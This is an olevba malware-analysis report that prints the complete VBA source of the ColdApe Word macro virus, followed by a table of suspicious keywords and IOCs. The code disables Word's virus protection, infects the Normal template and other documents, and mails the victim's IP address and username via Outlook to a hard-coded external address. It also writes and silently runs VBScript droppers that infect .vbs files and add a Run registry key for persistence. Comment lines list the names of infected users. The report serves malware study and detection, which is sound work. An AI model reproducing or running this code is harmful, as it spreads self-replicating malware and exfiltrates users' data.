olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ColdApe.ae-72d2a273ca2c15d18630934821f272a73e83e89f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ColdApe.ae-72d2a273ca2c15d18630934821f272a73e83e89f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'AVM
On Error Resume Next
Dim DC, IT As Integer
A = ActiveDocument.Saved
Application.EnableCancelKey = 1 And 0
Options.VirusProtection = 1 And 0
Options.ConfirmConversions = 1 And 0
Options.SaveNormalPrompt = 1 And 0
gen = 67
Dim theApp, theNameSpace, theMailItem
Dim IPSocket
On Error Resume Next
Set IPSocket = CreateObject("MSWinsock.Winsock")
IPADDY = IPSocket.LocalIP
Set BOB = CreateObject("Wscript.Network")
For X = 1 To 2
If X = 1 Then EMADDY = "hia@uidivo.deltanet.ro" Else EMADDY = "hia@uidivo.deltanet.ro"
If X = 1 Then MSGBDY = IPADDY & " 57 11/15/2000 8:29:06 PM" Else MSGBDY = "Dear Nicky... my name is 11111 and I want to make hot monkey love with you. You anti-virus stud!"
Set theApp = WScript.CreateObject("Outlook.Application")
Set theNameSpace = theApp.GetNameSpace("MAPI")
theNameSpace.Logon "profile", "password"
Set theMailItem = theApp.CreateItem(0)
theMailItem.Recipients.Add EMADDY
theMailItem.Subject = BOB.UserName
theMailItem.Body = MSGBDY
theMailItem.Send
theNameSpace.Logoff
Next




If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "'" & Application.UserName & " Loves Nicky F. Also! " & Now
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
IT = (Day(Now))
If IT >= 30 Then IT = 0
DC = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC")
If DC = "" Or DC < IT Or IT = 0 Then
GoOk = True
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC") = IT
End If
TestCon = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS")
If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine", "") = "VBScript" Then SIY = True
If SIY = True And TestCon <> "Done" Then
Open "c:\happy.vbs" For Output As 1
Print #1, "'§"
Print #1, ""
Print #1, "On Error Resume Next"
Print #1, "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
Print #1, "Dim T111"
Print #1, "Dim IV5(200)"
Print #1, "Dim XR"
Print #1, "Set WSHShell = Wscript.CreateObject(""Wscript.Shell"")"
Print #1, "Set WshSysEnv = WSHShell.Environment(""Process"")"
Print #1, "IV10 = WshSysEnv(""Path"")"
Print #1, "IV7 = WSHShell.ExpandEnvironmentStrings(""%windir%\avm.vbs"")"
Print #1, "IV1 = Wscript.ScriptFullName"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "XR = 1"
Print #1, "T11 = Wscript.ScriptFullName"
Print #1, "For x = Len(IV10) To 1 Step -1"
Print #1, "IV4 = Mid(IV10, x, 1)"
Print #1, "If IV4 <> "";"" Then"
Print #1, "IV5(XR) = IV4 + IV5(XR)"
Print #1, "ElseIf IV4 = "";"" Then"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "XR = XR + 1"
Print #1, "End If"
Print #1, "Next"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "IV5(XR + 1) = WSHShell.SpecialFolders(""Desktop"") + ""\"""
Print #1, "IV5(XR + 2) = WSHShell.SpecialFolders(""MyDocuments"") + ""\"""
Print #1, "IV5(XR + 3) = WSHShell.SpecialFolders(""Startup"") + ""\"""
Print #1, "IV5(XR + 4) = Left(T11, InStrRev(T11, ""\""))"
Print #1, "Set TS = IV6.OpenTextFile(T11, 1)"
Print #1, "IV9 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "IV8 = Chr(167)"
Print #1, "endIV8 = ""'"" & IV8"
Print #1, "For x = Len(IV9) To 1 Step -1"
Print #1, "If Mid(IV9, x, 1) = IV8 Then"
Print #1, "x = 1"
Print #1, "IV3 = endIV8 + IV3"
Print #1, "ElseIf Mid(IV9, x, 1) <> IV8 Then"
Print #1, "IV3 = Mid(IV9, x, 1) + IV3"
Print #1, "End If"
Print #1, "Next"
Print #1, "For y = 1 To (XR + 4)"
Print #1, "For Each Target In IV6.GetFolder(IV5(y)).Files"
Print #1, "If UCase(Right(Target.Name, 3)) = ""VBS"" Then"
Print #1, "IV11 = """""
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
Print #1, "IV11 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "If mid(IV11,(len(IV11)-2),1) <> ""¥"" Then"
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)"
Print #1, "TS.Write IV3"
Print #1, "TS.Close"
Print #1, "End If"
Print #1, "End If"
Print #1, "Next"
Print #1, "Next"
Print #1, "FIV11 (IV7)"
Print #1, "If T111 = False Then"
Print #1, "WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM"", IV7"
Print #1, "Set U187 = IV6.OpenTextFile(IV7, 2, True)"
Print #1, "U187.Write IV3"
Print #1, "U187.Close"
Print #1, "End If"
Print #1, "Function FIV11(filespec)"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "If (IV6.FileExists(filespec)) Then"
Print #1, "T111 = True"
Print #1, "Else"
Print #1, "T111 = False"
Print #1, "End If"
Print #1, "End Function"
Print #1, "' Nick ""The Love Monkey"" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
Print #1, "'¥"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS") = "Done"
Close 1
Shell "wscript c:\happy.vbs", vbHide
End If





Open "c:\A4.vbs" For Output As 1
Print #1, "Dim theApp, theNameSpace, theMailItem"
Print #1, "Dim IPSocket"
Print #1, "On Error Resume Next"
Print #1, "Set IPSocket = CreateObject(""MSWinsock.Winsock"")"
Print #1, "IPADDY = IPSocket.LocalIP"
Print #1, "set BOB = CreateObject(""Wscript.Network"")"
Print #1, "For x = 1 To 2"
Print #1, "If x = 1 Then EMADDY = ""hia@uidivo.deltanet.ro"" Else EMADDY = ""hia@uidivo.deltanet.ro"""
Print #1, "if x = 1 then MSGBDY = IPADDY & " & Chr(34) & Str(gen) & " " & Now & Chr(34) & " else MSGBDY = ""Dear Nicky... my name is " & Application.UserName & " and I want to make hot monkey love with you. You anti-virus stud!"""
Print #1, "Set theApp = WScript.CreateObject(""Outlook.Application"")"
Print #1, "Set theNameSpace = theApp.GetNameSpace(""MAPI"")"
Print #1, "theNameSpace.Logon ""profile"", ""password"""
Print #1, "Set theMailItem = theApp.CreateItem(0)"
Print #1, "theMailItem.Recipients.Add EMADDY"
Print #1, "theMailItem.Subject = BOB.Username"
Print #1, "theMailItem.Body = MSGBDY"
Print #1, "theMailItem.Send"
Print #1, "theNameSpace.Logoff"
Print #1, "Next"
Print #1, theMailItem.Recipients
Print #1, theNameSpace
Close 1
Shell "wscript c:\a4.vbs", vbHide
If ActiveDocument.Saved <> A Then ActiveDocument.Saved = A
' Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia
'Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM
'James Matthiessen Loves Nicky F. Also! 11/14/98 1:15:12 PM
'Russell Wigart Loves Nicky F. Also! 12/2/98 8:55:28 PM
'RYAN HANSEN Loves Nicky F. Also! 12/3/98 10:03:48 PM
'College of Agriculture Loves Nicky F. Also! 12/9/98 10:06:43 AM
'College of Agriculture Loves Nicky F. Also! 12/9/98 10:18:22 AM
'LR&C Loves Nicky F. Also! 12/9/98 12:22:53 PM
'Preferred Customer Loves Nicky F. Also! 1/6/99 3:13:52 PM
'Matthew Glagolich Loves Nicky F. Also! 1/15/99 3:15:17 PM
'steph Loves Nicky F. Also! 1/19/99 3:53:32 PM
'student Loves Nicky F. Also! 1/20/99 10:03:04 AM
'student Loves Nicky F. Also! 3/4/99 7:55:33 PM
'student Loves Nicky F. Also! 3/4/99 7:59:49 PM
'Soquani Wilde Loves Nicky F. Also! 3/8/99 3:24:11 PM
'Student Loves Nicky F. Also! 3/11/99 10:27:36 PM
'jaime allison Loves Nicky F. Also! 3/11/99 10:35:57 PM
'Student Loves Nicky F. Also! 4/11/99 9:02:42 PM
'Student Loves Nicky F. Also! 4/11/99 9:26:38 PM
'Student Loves Nicky F. Also! 4/13/99 3:17:22 PM
'Jason Kistenmacher Loves Nicky F. Also! 4/14/99 4:30:56 PM
'Student Loves Nicky F. Also! 4/26/99 12:18:33 PM
'Student Loves Nicky F. Also! 5/17/99 8:30:50 PM
'AIESEC Brasov Loves Nicky F. Also! 5/18/99 10:21:37 AM
'Raluca Loves Nicky F. Also! 27.05.1999 19:05:08
'Catalina Loves Nicky F. Also! 01.03.2000 10:10:06
'Catalina Loves Nicky F. Also! 13.03.2000 13:26:49
'Yogy Loves Nicky F. Also! 06/24/2000 04:13:28
'radu Loves Nicky F. Also! 27.07.2000 23:31:13
'nobody Loves Nicky F. Also! 7/25/2000 22:13:19
'cata Loves Nicky F. Also! 25.07.00 23:34:37
'Michael Horn Loves Nicky F. Also! 15.09.00 20:41:45
'11111 Loves Nicky F. Also! 11/15/2000 8:13:32 PM
End Sub
Private Sub Document_New()

'11111 Loves Nicky F. Also! 12/19/2000 8:56:44 PM
'Total Konfuzion Loves Nicky F. Also! 04.12.00 12:57:03
'Righard J. Zwienenberg Loves Nicky F. Also! 1/9/01 11:26:58 AM
'Replication System Loves Nicky F. Also! 11/01/01 16:19:57
'Total Konfuzion Loves Nicky F. Also! 22.02.01 10:59:07
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |happy.vbs           |Executable file name                         |
|IOC       |avm.vbs             |Executable file name                         |
|IOC       |A4.vbs              |Executable file name                         |
|IOC       |a4.vbs              |Executable file name                         |
+----------+--------------------+---------------------------------------------+
